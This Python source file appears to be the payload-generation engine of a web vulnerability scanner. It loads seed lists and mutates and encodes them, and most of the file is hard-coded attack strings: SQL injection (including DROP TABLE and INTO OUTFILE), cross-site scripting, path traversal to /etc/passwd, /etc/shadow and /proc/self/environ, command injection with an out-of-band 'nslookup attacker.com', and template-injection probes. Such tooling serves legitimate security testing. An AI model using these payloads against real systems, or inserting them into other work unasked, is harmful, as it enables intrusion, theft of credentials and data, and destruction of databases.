"""
Payload Generator Engine — INFINITE PAYLOAD GENERATION
Author: ARIF
"""

import os
import random
import re
import logging
from typing import List, Dict, Optional
from payloads.engine.encoder import PayloadEncoder
from payloads.engine.mutator import PayloadMutator
from payloads.engine.combinator import PayloadCombinator
from payloads.engine.context import ContextAdaptor


class PayloadGenerator:
    def __init__(self, config: Dict):
        self.logger = logging.getLogger(__name__)
        self.config = config
        self.encoder = PayloadEncoder(config)
        self.mutator = PayloadMutator(config)
        self.combinator = PayloadCombinator(config)
        self.context = ContextAdaptor(config)
        self.seeds = self._load_all_seeds()
        self.generated_payloads = {}

    def _load_all_seeds(self) -> Dict[str, List[str]]:
        seeds = {}
        seed_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "seeds")
        if not os.path.exists(seed_dir):
            return seeds
        for filename in os.listdir(seed_dir):
            if filename.endswith("_seeds.txt"):
                module_name = filename.replace("_seeds.txt", "")
                filepath = os.path.join(seed_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        module_seeds = [line.strip() for line in f
                                       if line.strip() and not line.startswith('#')]
                        if module_seeds:
                            seeds[module_name] = module_seeds
                            self.logger.info(f"Loaded {len(module_seeds)} seeds for {module_name}")
                except Exception as e:
                    self.logger.warning(f"Failed to load seeds from {filename}: {e}")
        return seeds

    def get_payloads(self, module: str, limit: int = 200,
                     enable_mutations: bool = True,
                     enable_encodings: bool = True,
                     enable_context: bool = True) -> List[str]:
        seeds = self.seeds.get(module, self._get_default_seeds(module))
        if not seeds:
            self.logger.warning(f"No seeds found for module: {module}, using defaults")
            seeds = self._get_default_seeds(module)

        max_payloads = self.config.get("payload_generation", {}).get("max_payloads_per_test", 500)
        limit = min(limit, max_payloads)

        all_payloads = list(seeds)
        all_payloads.extend(self._generate_variants(seeds, module, enable_mutations, enable_encodings))

        if enable_context:
            all_payloads = self.context.adapt(all_payloads, module)

        all_payloads = list(set(all_payloads))
        random.shuffle(all_payloads)

        if len(all_payloads) > limit:
            sampling_rate = self.config.get("payload_generation", {}).get("sampling_rate", 0.3)
            sample_size = min(int(len(all_payloads) * sampling_rate), limit)
            all_payloads = random.sample(all_payloads, max(sample_size, len(seeds)))

        return all_payloads[:limit]

    def _generate_variants(self, seeds: List[str], module: str,
                           enable_mutations: bool, enable_encodings: bool) -> List[str]:
        variants = []
        for seed in seeds[:50]:
            if enable_mutations:
                mutations = self.mutator.mutate(seed, module)
                variants.extend(mutations)
            if enable_encodings:
                encodings = self.encoder.encode_all(seed, module)
                variants.extend(encodings)
        if enable_mutations and enable_encodings:
            base_variants = list(variants[:30]) if len(variants) > 30 else variants
            for variant in base_variants:
                cross_encodings = self.encoder.encode_all(variant, module)
                variants.extend(cross_encodings[:10])
        return variants[:200]

    def _get_default_seeds(self, module: str) -> List[str]:
        default_seeds = {
            "sqli": [
                "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "\" OR 1=1--",
                "' OR '1'='1'--", "' OR 1=1-- -", "' OR 1=1/**/", "1' OR '1'='1",
                "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
                "1' ORDER BY 1--", "' AND 1=1--", "' AND 1=2--",
                "'; DROP TABLE users--", "' OR '1'='1' /*", "' OR '1'='1' -- -",
                "' WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
                "' AND 1=0 UNION SELECT 1,2,3--", "' HAVING 1=1--",
                "' GROUP BY 1--", "' AND 1=1 AND '%'='",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "\" OR \"\"=\"", "\" OR 1=1--", "1\" OR \"1\"=\"1",
                "' OR 1 IN (SELECT 1)--", "' OR EXISTS(SELECT 1)--",
                "' OR NOT EXISTS(SELECT 1)--", "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
                "' OR 1=1 INTO DUMPFILE '/tmp/test.txt'--",
                "') OR ('1'='1", "')) OR ((1=1", "'))); DROP TABLE users;--"
            ],
            "xss": [
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
                "javascript:alert(1)", "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>", "';alert(1);//",
                "\"-alert(1)-", "\"-confirm(1)-", "\"-prompt(1)-",
                "<script>alert(document.cookie)</script>", "<img src=x onerror=alert(document.cookie)>",
                "<svg onload=alert(String.fromCharCode(88,83,83))>",
                "';alert(String.fromCharCode(88,83,83))//",
                "\\\";alert(1);//", "</script><script>alert(1)</script>",
                "<IMG SRC=\"javascript:alert('XSS')\">",
                "<IMG SRC=javascript:alert('XSS')>",
                "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
                "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
                "<IMG SRC=# onmouseover=\"alert('xxs')\">",
                "<IMG onmouseover=\"alert('xxs')\">",
                "<IMG SRC= onmouseover=\"alert('xxs')\">",
                "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
                "<SCRIPT>document.write('<SCRI');</SCRIPT>PT>alert(1)</SCRIPT>",
                "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
                "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
                "<BODY ONLOAD=alert('XSS')>",
                "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
                "<DIV STYLE=\"width: expression(alert('XSS'));\">",
                "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
                "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS')\">",
                "<STYLE>@import'javascript:alert(\"XSS\")';</STYLE>",
                "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS')\">",
                "<IFRAME SRC=\"javascript:alert('XSS')\"></IFRAME>",
                "<FRAMESET><FRAME SRC=\"javascript:alert('XSS')\"></FRAMESET>",
                "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
                "<DIV ONMOUSEOVER=\"alert('XSS')\" STYLE=\"width: 100px; height: 100px\">",
                "<A HREF=\"javascript:alert('XSS')\">CLICK</A>"
            ],
            "lfi": [
                "../../../../etc/passwd", "../../../etc/passwd",
                "../../etc/passwd", "../etc/passwd",
                "....//....//....//etc/passwd",
                "..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
                "/etc/passwd%00", "../../../../etc/passwd%00",
                "../../../../etc/passwd%2500",
                "../../../../etc/hosts",
                "../../../../etc/shadow",
                "../../../../etc/group",
                "../../../../etc/issue",
                "../../../../etc/motd",
                "../../../../proc/self/environ",
                "../../../../proc/self/fd/0",
                "../../../../proc/self/fd/1",
                "../../../../proc/self/fd/2",
                "../../../../proc/self/cmdline",
                "../../../../proc/version",
                "../../../../proc/cpuinfo",
                "../../../../proc/meminfo",
                "../../../../proc/net/tcp",
                "../../../../proc/net/arp",
                "../../../../proc/mounts",
                "../../../../proc/self/cwd/index.php",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=config.php",
                "php://filter/read=convert.base64-encode/resource=../config.php",
                "php://filter/read=convert.base64-encode/resource=../../config.php",
                "php://filter/read=string.rot13/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "file:///c:/boot.ini",
                "file:///c:/windows/system32/drivers/etc/hosts",
                "file:///etc/hosts",
                "/proc/self/environ",
                "/proc/self/fd/0",
                "/proc/self/fd/1",
                "/proc/self/fd/2",
                "....//....//....//....//....//etc/passwd",
                "..;/..;/..;/..;/etc/passwd",
                "..%252f..%252f..%252f..%252fetc/passwd",
                "..%c0%ae..%c0%ae..%c0%ae..%c0%aeetc/passwd",
                "%252e%252e%252fetc/passwd"
            ],
            "command": [
                "; ls", "| ls", "`ls`", "$(ls)", "& ls",
                "; id", "| id", "`id`", "$(id)", "& id",
                "; whoami", "| whoami", "`whoami`", "$(whoami)",
                "; pwd", "| pwd", "`pwd`", "$(pwd)",
                "; uname -a", "| uname -a", "`uname -a`",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "; echo test", "| echo test",
                "| dir", "; dir", "`dir`",
                "| type %SystemRoot%\\win.ini",
                "; sleep 5", "| sleep 5", "`sleep 5`",
                "& ping -c 10 127.0.0.1 &",
                "| ping -n 10 127.0.0.1",
                "& nslookup google.com &",
                "1; ls", "1|ls", "1`ls`",
                "1 & ls", "1 && ls", "1 || ls",
                "1; cat /etc/passwd", "1|cat /etc/passwd",
                "1;id", "1|id", "1;whoami",
                "1;uname -a", "1|uname -a",
                "1;ping -c 1 127.0.0.1",
                "1|ping -n 1 127.0.0.1",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "& cat /etc/passwd #",
                "| cat /etc/passwd #",
                "';cat /etc/passwd;'",
                "\";cat /etc/passwd;\"",
                "'; ls; '", "\"; ls; \"",
                "1 & nslookup attacker.com &",
                "1 | nslookup attacker.com",
                "1; nslookup attacker.com",
                "%0Als", "%0Aid", "%0Awhoami",
                "%0Acat%20/etc/passwd",
                "|%20ls", ";%20id", "`%20whoami`"
            ],
            "ssti": [
                "{{7*7}}", "{{7*'7'}}", "{{config}}",
                "{{self}}", "{{request}}", "{{session}}",
                "{{app}}", "{{g}}", "{{url_for}}",
                "{{get_flashed_messages}}",
                "${7*7}", "${7*7}", "#{7*7}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{config.__class__.__init__.__globals__}}",
                "{{''.__class__.__mro__}}",
                "{{''.__class__.__bases__}}",
                "{{()|attr('__class__')}}",
                "{{request|attr('application')}}",
                "{{request.environ}}",
                "{{request.headers}}",
                "{{request.cookies}}",
                "{{request.args}}",
                "{{request.form}}",
                "{php}echo 49;{/php}",
                "{$smarty.version}",
                "{7*7}",
                "${7*7}",
                "#set($x=7*7)$x",
                "{{constructor}}",
                "{{__proto__}}",
                "{{this}}",
                "${{7*7}}",
                "@@7*7@@",
                "#{7*7}",
                "{{= 7*7 }}",
                "{{=7*7}}",
                "[$7*7$]",
                "{{7*7}}",
                "{{7e7}}",
                "{7*7}",
                "${7*7}",
                "#{7*7}",
                "*{7*7}",
                "{=7*7}",
                "{{= 7*7 =}}",
                "${7*7}",
                "${{7*7}}",
                "@@7*7@@"
            ]
        }
        return default_seeds.get(module, ["test", "payload", "1", "' OR 1=1--"])

    def get_all_generated_count(self) -> int:
        return sum(len(v) for v in self.generated_payloads.values())

    def get_module_payload_count(self, module: str) -> int:
        return len(self.generated_payloads.get(module, []))
